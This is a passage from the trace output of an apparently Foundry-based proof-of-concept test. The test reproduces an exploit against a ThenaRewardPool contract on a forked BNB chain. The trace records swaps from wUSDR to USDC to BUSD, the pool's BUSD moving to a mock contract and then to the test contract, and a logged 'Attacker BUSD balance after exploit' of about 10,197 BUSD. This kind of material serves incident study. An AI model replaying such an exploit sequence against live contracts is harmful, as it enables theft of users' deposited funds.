    │   │   │   │   │   └─ ← [Return] 5035780535038846249622 [5.035e21]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000465eb6996ab000000000000000000000000000000000000000000000110fd7e63e8b8f92a96
    │   │   │   ├─ [300] wUSDR_USDC::isStable() [staticcall]
    │   │   │   │   └─ ← [Return] false
    │   │   │   ├─ [2612] wUSDR::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 4835787773611 [4.835e12])
    │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 4835787773611 [4.835e12])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [0] console::log("thena swap in: %s out %s", 4835787773611 [4.835e12], 0) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [66356] UniV2Router::swapExactTokensForTokens(4835787773611 [4.835e12], 0, [(0x2952beb1326acCbB5243725bd4Da2fC937BCa087, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, false)], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [3127] wUSDR_USDC::getAmountOut(4835787773611 [4.835e12], wUSDR: [0x2952beb1326acCbB5243725bd4Da2fC937BCa087]) [staticcall]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   └─ ← [Return] 5035780535038846249622 [5.035e21]
    │   │   │   │   ├─ [5944] wUSDR::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], 4835787773611 [4.835e12])
    │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 0)
    │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], value: 4835787773611 [4.835e12])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [42684] wUSDR_USDC::swap(0, 5035780535038846249622 [5.035e21], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0x)
    │   │   │   │   │   ├─ [1193] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPaused() [staticcall]
    │   │   │   │   │   │   ├─ [377] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPaused() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [4039] USDC::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 5035780535038846249622 [5.035e21])
    │   │   │   │   │   │   ├─ [3293] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 5035780535038846249622 [5.035e21]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 5035780535038846249622 [5.035e21])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1594717043782799 [1.594e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1658951577926348290279983 [1.658e24]
    │   │   │   │   │   │   └─ ← [Return] 1658951577926348290279983 [1.658e24]
    │   │   │   │   │   ├─ [1378] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(false) [staticcall]
    │   │   │   │   │   │   ├─ [559] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(false) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000014
    │   │   │   │   │   ├─ [1231] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::dibs() [staticcall]
    │   │   │   │   │   │   ├─ [415] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::dibs() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   ├─ [1202] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::MAX_REFERRAL_FEE() [staticcall]
    │   │   │   │   │   │   ├─ [386] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   ├─ [3259] wUSDR::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 1160589065 [1.16e9])
    │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: 0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, value: 1160589065 [1.16e9])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1223] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::stakingNFTFee() [staticcall]
    │   │   │   │   │   │   ├─ [407] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::stakingNFTFee() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   ├─ [803] 0x047B2316aD07241fAF8Ac638D67792e1f146A8A9::processStakingFees(1872417026 [1.872e9], true)
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [3259] wUSDR::transfer(0x047B2316aD07241fAF8Ac638D67792e1f146A8A9, 8510986482 [8.51e9])
    │   │   │   │   │   │   ├─ emit Transfer(from: wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a], to: 0x047B2316aD07241fAF8Ac638D67792e1f146A8A9, value: 8510986482 [8.51e9])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Fees(param0: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], param1: 9671575547 [9.671e9], param2: 0)
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1594707372207252 [1.594e15]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(wUSDR_USDC: [0xA99c4051069B774102d6D215c6A9ba69BD616E6a]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 1658951577926348290279983 [1.658e24]
    │   │   │   │   │   │   └─ ← [Return] 1658951577926348290279983 [1.658e24]
    │   │   │   │   │   ├─ emit Sync(: 1594707372207252 [1.594e15], : 1658951577926348290279983 [1.658e24])
    │   │   │   │   │   ├─ emit Swap(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0In: 4835787773611 [4.835e12], amount1In: 0, amount0Out: 0, amount1Out: 5035780535038846249622 [5.035e21], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─  emit topic 0: 0xff3715fa8f2d4d791dd7a610a545050b8c6fe3a62b0f6c38f2f96a00598fe483
    │   │   │   │   │        topic 1: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │        topic 2: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000465eb6996ab0000000000000000000000002952beb1326accbb5243725bd4da2fc937bca087
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000465eb6996ab000000000000000000000000000000000000000000000110fd7e63e8b8f92a96
    │   │   │   ├─ [1296] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 10096969660375960293491 [1.009e22]
    │   │   │   │   └─ ← [Return] 10096969660375960293491 [1.009e22]
    │   │   │   ├─ [22739] UniV2Router::getAmountsOut(10096969660375960293491 [1.009e22], [(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, 0x55d398326f99059fF775485246999027B3197955, true)]) [staticcall]
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [17206] USDC_BUSD::getAmountOut(10096969660375960293491 [1.009e22], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d]) [staticcall]
    │   │   │   │   │   ├─ [1368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   ├─ [549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 10089706261008774455811 [1.008e22]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000002235b9a3a12eda29073000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   │   │   ├─ [0] console::log("sell usdc to usdt %s %s", 10096969660375960293491 [1.009e22], 10089706261008774455811 [1.008e22]) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [3143] 0x51597f405303C4377E36123cBc172b13269EA163::latestRoundData() [staticcall]
    │   │   │   │   ├─ [1410] 0x7008fDEd94a8Ce68D01FEB633C4D81C2be7a1B20::latestRoundData() [staticcall]
    │   │   │   │   │   └─ ← [Return] 27742 [2.774e4], 99976240 [9.997e7], 1679938025 [1.679e9], 1679938025 [1.679e9], 27742 [2.774e4]
    │   │   │   │   └─ ← [Return] 36893488147419130974 [3.689e19], 99976240 [9.997e7], 1679938025 [1.679e9], 1679938025 [1.679e9], 36893488147419130974 [3.689e19]
    │   │   │   ├─ [3143] 0xB97Ad0E74fa7d920791E90258A6E2085088b4320::latestRoundData() [staticcall]
    │   │   │   │   ├─ [1410] 0x2dc202b56A03667cC240B290c2BE2b8453E89eA1::latestRoundData() [staticcall]
    │   │   │   │   │   └─ ← [Return] 26972 [2.697e4], 100062000 [1e8], 1679938346 [1.679e9], 1679938346 [1.679e9], 26972 [2.697e4]
    │   │   │   │   └─ ← [Return] 36893488147419130204 [3.689e19], 100062000 [1e8], 1679938346 [1.679e9], 1679938346 [1.679e9], 36893488147419130204 [3.689e19]
    │   │   │   ├─ [23208] USDC::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 10096969660375960293491 [1.009e22])
    │   │   │   │   ├─ [22462] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::approve(UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], 10096969660375960293491 [1.009e22]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 10096969660375960293491 [1.009e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [0] console::log("thena swap in: %s out %s", 10096969660375960293491 [1.009e22], 10068139232819537542117 [1.006e22]) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [103695] UniV2Router::swapExactTokensForTokens(10096969660375960293491 [1.009e22], 10068139232819537542117 [1.006e22], [(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, 0x55d398326f99059fF775485246999027B3197955, true)], ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 1679938553 [1.679e9])
    │   │   │   │   ├─ [1461] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   ├─ [642] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPair(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [17206] USDC_BUSD::getAmountOut(10096969660375960293491 [1.009e22], USDC: [0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d]) [staticcall]
    │   │   │   │   │   ├─ [1368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   ├─ [549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] 10089706261008774455811 [1.008e22]
    │   │   │   │   ├─ [6786] USDC::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], 10096969660375960293491 [1.009e22])
    │   │   │   │   │   ├─ [6034] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transferFrom(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], 10096969660375960293491 [1.009e22]) [delegatecall]
    │   │   │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], value: 10096969660375960293491 [1.009e22])
    │   │   │   │   │   │   ├─ emit Approval(owner: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], spender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], value: 0)
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [65052] USDC_BUSD::swap(10089706261008774455811 [1.008e22], 0, ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 0x)
    │   │   │   │   │   ├─ [1193] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::isPaused() [staticcall]
    │   │   │   │   │   │   ├─ [377] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::isPaused() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [23171] BUSD::transfer(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], 10089706261008774455811 [1.008e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], value: 10089706261008774455811 [1.008e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 6270554778941762717695509 [6.27e24]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 7191523924711723723324722 [7.191e24]
    │   │   │   │   │   │   └─ ← [Return] 7191523924711723723324722 [7.191e24]
    │   │   │   │   │   ├─ [1368] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::getFee(true) [staticcall]
    │   │   │   │   │   │   ├─ [549] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::getFee(true) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [1231] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::dibs() [staticcall]
    │   │   │   │   │   │   ├─ [415] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::dibs() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000664ce330511653cb2744b8ed50dba31c6c4c08ca
    │   │   │   │   │   ├─ [1202] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::MAX_REFERRAL_FEE() [staticcall]
    │   │   │   │   │   │   ├─ [386] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   │   │   │   ├─ [4039] USDC::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 121163635924511523 [1.211e17])
    │   │   │   │   │   │   ├─ [3293] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, 121163635924511523 [1.211e17]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: 0x664cE330511653cB2744b8eD50DbA31C6c4C08ca, value: 121163635924511523 [1.211e17])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [1223] 0xAFD89d21BdB66d00817d4153E055830B1c2B3970::stakingNFTFee() [staticcall]
    │   │   │   │   │   │   ├─ [407] 0x879F8Fd307bA4442e22e77d47683F35313760dC8::stakingNFTFee() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000898
    │   │   │   │   │   ├─ [803] 0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1::processStakingFees(195477332624878591 [1.954e17], false)
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [4039] USDC::transfer(0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, 888533330113084506 [8.885e17])
    │   │   │   │   │   │   ├─ [3293] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, 888533330113084506 [8.885e17]) [delegatecall]
    │   │   │   │   │   │   │   ├─ emit Transfer(from: USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643], to: 0xABf4C5DD368eda2cFE40266b08e1B35DB802c0f1, value: 888533330113084506 [8.885e17])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Fees(param0: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], param1: 0, param2: 1009696966037596029 [1.009e18])
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 6270554778941762717695509 [6.27e24]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(USDC_BUSD: [0x618f9Eb0E1a698409621f4F487B563529f003643]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 7191522915014757685728693 [7.191e24]
    │   │   │   │   │   │   └─ ← [Return] 7191522915014757685728693 [7.191e24]
    │   │   │   │   │   ├─ emit Sync(: 6270554778941762717695509 [6.27e24], : 7191522915014757685728693 [7.191e24])
    │   │   │   │   │   ├─ emit Swap(sender: UniV2Router: [0x20a304a7d126758dfe6B243D0fc515F83bCA8431], amount0In: 0, amount1In: 10096969660375960293491 [1.009e22], amount0Out: 10089706261008774455811 [1.008e22], amount1Out: 0, to: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─  emit topic 0: 0xff3715fa8f2d4d791dd7a610a545050b8c6fe3a62b0f6c38f2f96a00598fe483
    │   │   │   │   │        topic 1: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │        topic 2: 0x00000000000000000000000039e29f4fb13aec505ef32ee6ff7cc16e2225b11f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000002235b9a3a12eda290730000000000000000000000008ac76a51cc950d9822d68b83fe1ad97b32cd580d
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000002235b9a3a12eda29073000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   │   │   ├─ [531] BUSD::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   └─ ← [Return] 10089706261008774455811 [1.008e22]
    │   │   │   ├─ [6989] ThenaRewardPool::netAssetValue() [staticcall]
    │   │   │   │   ├─ [6594] 0xaEDb00947B0BFd2723898F78018b4BB7b2398CdC::netAssetValue() [delegatecall]
    │   │   │   │   │   ├─ [531] BUSD::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 10089706261008774455811 [1.008e22]
    │   │   │   │   │   ├─ [1296] USDC::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [645] wUSDR::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [632] 0x2e537237143ABf74A176d0067bEEbeEbe845300a::balanceOf(ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   │   │   ├─ [0] console::log("nav: %s minNavExpected: %s", 10089706261008774455811 [1.008e22], 10089909806291176549697 [1.008e22]) [staticcall]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [3271] BUSD::transfer(MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10089706261008774455811 [1.008e22])
    │   │   │   │   ├─ emit Transfer(from: ThenaRewardPool: [0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F], to: MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10089706261008774455811 [1.008e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit Unstake(: 0, : 10089706261008774455811 [1.008e22])
    │   │   │   ├─ emit Reward(: 108179753928089354377 [1.081e20])
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000222f6cd72d526b9e203
    │   ├─ [531] BUSD::balanceOf(MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 10197886014936863810188 [1.019e22]
    │   ├─ [8071] BUSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10197886014936863810188 [1.019e22])
    │   │   ├─ emit Transfer(from: MockThenaRewardPool: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10197886014936863810188 [1.019e22])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 63 bytes of code
    ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10197896014936863810188 [1.019e22]
    ├─ [2425] BUSD::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance after exploit", val: 10197896014936863810188 [1.019e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 347.09ms (16.82ms CPU time)

